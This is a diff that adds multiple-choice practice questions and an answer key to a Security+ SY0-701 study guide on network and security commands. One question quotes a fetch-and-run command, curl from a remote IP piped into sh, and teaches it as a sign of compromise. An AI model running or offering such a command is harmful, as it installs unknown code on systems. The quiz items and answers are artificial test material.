@@ -359,6 +359,41 @@ SY0-701 doesn't ask you to type commands, but it *does* give you **command outpu
 
 </details>
 
+### 🎯 Exam-Style Practice (multiple choice)
+
+**MC1.** A user in a branch office says a cloud app has become very slow. Which command would BEST show which router along the path is adding the delay?
+A. `whoami`  B. `nslookup`  C. `tracert` / `traceroute`  D. `arp -a`
+
+**MC2.** A new intern wants to practise by running Nmap against a competitor's public website "just to look." What is the BEST advice?
+A. It is fine as long as only a SYN scan is used  B. It is fine because the website is public  C. Run it at night so nobody notices  D. Only scan systems you own or have written permission to test; scanning others can be illegal
+
+**MC3.** A student is building a lab with Kali Linux and a deliberately vulnerable Metasploitable 2 VM. Which VirtualBox network mode is SAFEST for the target VM?
+A. Bridged, so it appears on the home network  B. NAT, so it can download updates  C. Internal network, so the VMs can only talk to each other  D. Any mode, because the VM is virtual
+
+**MC4.** An analyst reviewing Windows Security logs sees 300 Event ID 4625 entries for one account from the same IP address, followed by a single Event ID 4624. What is the MOST likely explanation?
+A. The user forgot to log out  B. A port scan of the server  C. The server's clock is wrong  D. A password-guessing attack that finally succeeded
+
+**MC5.** A Linux server's command history contains `curl http://203.0.113.9/payload.sh | sh`. Why is this line a red flag?
+A. It downloads a script from the internet and runs it immediately  B. It only shows the HTTP headers of a web page  C. It flushes the DNS cache  D. It lists the processes running on the server
+
+**MC6.** A company has fixed a DNS poisoning problem on its DNS server, but one Windows PC still goes to the fake website. Which command should the technician run on that PC FIRST?
+A. `netstat -ano`  B. `ipconfig /flushdns`  C. `tracert example.com`  D. `ping 8.8.8.8`
+
+<details>
+<summary><b>Show multiple-choice answers</b></summary>
+
+| # | Answer | Why |
+|---|---|---|
+| MC1 | C | Traceroute lists every router hop with its response time, showing where the path slows or breaks; nslookup only resolves names. |
+| MC2 | D | The golden rule is written permission: scanning systems you don't own can be illegal even if they are public. |
+| MC3 | C | An internal network keeps the vulnerable VM away from the real network and the internet; bridged mode exposes it to everyone. |
+| MC4 | D | 4625 is a failed login and 4624 a successful one, so many failures then a success points to a brute-force attack that worked. |
+| MC5 | A | Piping a downloaded script straight into `sh` runs unknown code from the internet, a common way attackers install malware. |
+| MC6 | B | The PC may still hold the poisoned answer in its local DNS cache; `ipconfig /flushdns` clears it. |
+
+</details>
+
+
 ---
 
 ## 📌 Chapter Summary
